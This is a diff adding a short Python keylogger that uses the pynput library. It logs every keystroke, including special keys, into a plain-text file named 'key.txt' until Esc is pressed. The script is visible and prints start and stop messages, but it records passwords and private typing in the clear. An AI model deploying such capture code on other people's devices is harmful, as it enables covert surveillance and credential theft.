@@ -1,0 +1,28 @@
+from pynput import keyboard
+
+def capture_keys():
+    filename = "key.txt"
+    print("Key logging initiated. Press 'esc' to terminate.")
+
+    def on_press(key):
+        try:
+            # Log character keys
+            with open(filename, "a") as file:
+                file.write(f'{key.char}\n')
+        except AttributeError:
+            # Log special keys by their names
+            with open(filename, "a") as file:
+                file.write(f'{key}\n')
+
+    def on_release(key):
+        # Stop listener when 'esc' is pressed
+        if key == keyboard.Key.esc:
+            print("Key logging ended.")
+            return False
+
+    # Start listening to keyboard events
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    capture_keys()
